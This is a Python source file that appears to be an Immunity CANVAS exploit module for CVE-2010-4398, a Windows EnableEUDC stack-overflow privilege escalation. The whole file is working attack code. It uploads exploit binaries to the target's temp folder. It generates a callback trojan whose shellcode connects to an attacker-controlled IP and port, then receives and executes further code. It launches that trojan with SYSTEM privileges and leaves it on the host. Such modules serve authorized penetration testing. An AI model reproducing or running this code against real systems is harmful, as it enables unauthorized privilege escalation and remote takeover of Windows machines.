#!/usr/bin/env python
# (c) Immunity, Inc. 2010


import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib


#GUI Info
NAME='Windows EnableEUDC Privilege Escalation Exploit'
DESCRIPTION='EnableEUDC Stack Overflow Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2010-4398'
DOCUMENTATION['Notes']='Tested on Windows 7 x86/64.'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2008', '7', 'Vista']

NOTES="""
Usage:
Win32/MOSDEF$ runmodule ms_enableeudc
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',[0,0,0,0]]
}

# Some globals to make the code a little more readable
CFF = 0x43464620
CHECKSUM = 0
OFFSET = 1
LENGTH = 2
TABLEDATA = 3


from ExploitTypes.localexploit import LocalExploit
from engine.config import canvas_root_directory

import random

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.files          = {'x86' :'ms_enableeudc.exe', 'x64': 'ms_enableeudc-64.exe' }
        self.MS_ENABLEEUDC  = [ 'ms_enableeudc.exe' ]
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'CB%s.EXE'%random.randint(0,1000)
	self.isX64          = False
        return 
    
    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def init_ms_enableeudc(self):
        """
        Uploads the ms_enableeudc exe
        """

        if self.isX64:
            filename = self.files["x64"]
        else:
            filename = self.files["x86"]

        self.MS_ENABLEEUDC[0] = filename

        for file in self.MS_ENABLEEUDC:
            src = os.path.join(self.local_path, file)
            dst = os.path.join(self.remote_path, file)
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('[+] Uploaded %s to %s' % (src, dst))            
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('[-] Could not upload %s to %s' % (src, dst))
                return False
        return True

    def uninit_ms_enableeudc(self):
        """
        Remove the ms_enableeudc exe
        """
        for file in self.MS_ENABLEEUDC:
            try:
                dst = os.path.join(self.remote_path, file)
                ret = self.node.shell.unlink(dst)
                self.log('[+] %s' % ret)
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                return False
        return True

    def spawn_ms_enableeudc(self, arg1):
        """
        spawn MS_ENABLEEUDC
        """
        try:
            dst = os.path.join(self.remote_path, self.MS_ENABLEEUDC[0])
            ret = self.node.shell.CreateProcessA(dst + ' ' +'"'+arg1+'"', 
                                                 inherithandles=1, 
                                                 dwCreationFlags = 0x00000200)
            self.log(ret)
            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def init_callback(self):
        """
        Build + upload the MOSDEF callback trojan
        """
        if not self.callback:
            self.log('[-] No callback set!')
            return False
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback.port, 
                                      'ipaddress' : self.callback.ip})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!
            callback_payload = sc.get()
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(callback_payload)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('[+] Creating callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            # upload the binary
            self.log('[+] Uploading callback trojan ...')
            dst = os.path.join(self.remote_path, self.trojan_name)
            ret = self.node.shell.upload(src, destfilename = dst)
            self.log('[+] %s' % ret)
            os.unlink(src)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.get_args()

        if self.node.nodetype.lower() not in ['win32node', 'win64node']:
            self.log('[-] Node Type %s not supported ...'%self.node.nodetype)
            return False

        ret, nodeos = self.node.shell.GetVersionEx()
        minor, major = nodeos['Minor Version'], nodeos['Major Version']
        if major < 6:
            self.log('This exploit is only for Windows 2008/7/Vista')
            return False

	
        self.isX64 = False 
        if self.node.nodetype == "win32Node":
            #if WoW, then use x64
            if self.node.shell.is_wow_64:
                self.isX64 = True 
        elif self.node.nodetype == "win64Node":
            self.isX64 = True 
            
        #first, we check to make sure we are not 
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[self.node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))

	if self.isX64:
	    self.remote_path=self.node.shell.GetEnvironmentVariable('TEMP')
	else:
	    self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_callback() == False:
            self.log('[-] Could not init callback ...')
            return False

        # upload ms_enableeudc binaries
        if self.init_ms_enableeudc() == False:
            self.log('[-] Could not init MS_ENABLEEUDC ...')
            return False

        # spawn ms_enableeudc
        trojan = os.path.join(self.remote_path, self.trojan_name)

        if self.spawn_ms_enableeudc(trojan) == False:
            self.log('[-] Could not spawn ms_enableeudc ...')
            return False

        self.log('[+] Sleeping 5 seconds before MS_ENABLEEUDC uninit ...')
        time.sleep(5)

        # remove files ... can't remove trojan (active process)
        if self.uninit_ms_enableeudc() == False:
            self.log('[-] Could not uninit MS_ENABLEEUDC...')
            return False

        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.trojan_name))

        # check for callback success ...
        if self.ISucceeded():
            self.log('[+] MS_ENABLEEUDC succeeded ...')
        else:
            self.log('[-] MS_ENABLEEUDC failed ...')
            return False

        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)     
